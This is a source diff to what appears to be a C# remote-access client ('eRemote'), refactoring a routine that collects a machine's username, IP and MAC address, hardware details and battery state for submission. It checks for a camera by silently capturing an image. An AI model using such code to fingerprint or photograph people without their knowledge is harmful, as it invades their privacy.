@@ -1,6 +1,7 @@
 ﻿using Microsoft.Win32;
 using System;
 using System.Collections;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Management;
 
@@ -13,14 +14,14 @@ namespace eRemote_V2._0
         {
             return value.ToString("yyyyMMddHHmmssffff");
         }
-        public static ArrayList GetOperatingSystemInfo()
+        public static List<string> GetOperatingSystemInfo()
         {
 
             string osname = "";
             string architecture = "";
             string processname = "";
             string memory = "";
-            bool isHaveCamera = false;
+            int isHaveCamera = 0;
 
             ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
             foreach (ManagementObject managementObject in mos.Get())
@@ -62,13 +63,11 @@ namespace eRemote_V2._0
             }
 
 
-
-
             var isSucess = Camera.Capture($"./objs/test_camera.png");
             var isHaveMicrophone = Microphone.IsHaveMicrophone();
             if (isSucess != null)
             {
-                isHaveCamera = true;
+                isHaveCamera = 1;
             }
             var username = Environment.UserName;
             var gpuName = GetGpuInfo().ToString();
@@ -80,21 +79,23 @@ namespace eRemote_V2._0
 
             batteryPercentage = (int)BatteryPercentage();
 
-            ArrayList InfoForSubmit = new ArrayList
-            {
-                osname,
-                architecture,
-                processname,
-                memory,
-                isHaveCamera,
-                isHaveMicrophone,
-                macAddress,
-                batteryPercentage,
-                ip,
-                gpuName,
-                isHaveBattery,
-                username
-            };
+ 
+            var InfoForSubmit = new List<string>();
+            InfoForSubmit.Add(username);
+            InfoForSubmit.Add(ip);
+            InfoForSubmit.Add(macAddress);
+
+            InfoForSubmit.Add(osname);
+            InfoForSubmit.Add(architecture);
+            InfoForSubmit.Add(processname);
+            InfoForSubmit.Add(memory);
+            InfoForSubmit.Add(gpuName);
+
+
+            InfoForSubmit.Add(isHaveCamera.ToString());
+            InfoForSubmit.Add(isHaveMicrophone.ToString());
+            InfoForSubmit.Add(isHaveBattery.ToString());
+            InfoForSubmit.Add(batteryPercentage.ToString());
 
 
 
@@ -143,7 +144,7 @@ namespace eRemote_V2._0
 
         }
 
-        private static bool GetBattrey()
+        private static int GetBattrey()
         {
             ObjectQuery query = new ObjectQuery("Select * FROM Win32_Battery");
             ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
@@ -155,11 +156,11 @@ namespace eRemote_V2._0
                 foreach (PropertyData property in mo.Properties)
                 {
                     Debug.WriteLine("Property {0}: Value is {1}", property.Name, property.Value);
-                    return true;
+                    return 1;
                 }
             }
             Debug.WriteLine("There's No Battery Detected");
-            return false;
+            return 0;
         }
 
 
